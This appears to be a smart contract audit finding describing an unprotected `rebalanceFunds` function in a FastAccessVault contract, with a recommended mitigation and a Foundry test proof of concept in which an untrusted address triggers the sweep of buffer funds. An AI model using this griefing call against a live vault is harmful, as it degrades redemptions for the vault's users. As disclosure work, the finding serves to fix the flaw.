  "user_handle": "ETHworker",
  "body": "## Finding description and impact\n`rebalanceFunds` is `external` and unprotected. Any caller can sweep all buffer funds above `targetBufferPercentageBPS` to the off-chain custodian, at zero cost, immediately after each mint/top-up. An attacker can repeatedly drain the buffer to the minimum (or lower if target is small), forcing redemptions onto the slow custodian path and defeating the “fast access” guarantee.\n\n## Recommended mitigation steps\nRestrict `rebalanceFunds` to an authorized role (admin/keeper), or add guardrails such as a minimum on-chain buffer that cannot be swept, rate limits, or checks that only trusted actors can initiate rebalances.",
  "proof_of_concept": "```solidity\n// forge test --match-path test/pocs/poc_fast_access_buffer_grief.t.sol\nimport \"forge-std/Test.sol\";\nimport {FastAccessVault} from \"src/protocol/FastAccessVault.sol\";\nimport {MockERC20} from \"test/mocks/MockERC20.sol\";\nimport {MockIssuerContract} from \"test/mocks/MockIssuerContract.sol\";\n\ncontract RebalanceGriefPOC is Test {\n    FastAccessVault fav;\n    MockERC20 vaultToken;\n    MockIssuerContract issuer;\n    address custodian = address(0xC0DE);\n\n    function setUp() public {\n        vaultToken = new MockERC20(\"v\", \"v\");\n        issuer = new MockIssuerContract(1_000 ether);\n        fav = new FastAccessVault(address(vaultToken), address(issuer), custodian, 5000, 0, address(this));\n        issuer.setVault(address(fav));\n        vaultToken.mint(address(fav), 1000 ether); // seed buffer above target\n    }\n\n    function test_AttackerDrainsBuffer() public {\n        uint256 beforeBalance = vaultToken.balanceOf(address(fav));\n        vm.prank(address(0xBAD));\n        fav.rebalanceFunds(); // sends all excess to custodian despite caller not being trusted\n        uint256 afterBalance = vaultToken.balanceOf(address(fav));\n        assertLt(afterBalance, beforeBalance, \"attacker drained buffer\");\n    }\n}\n```",
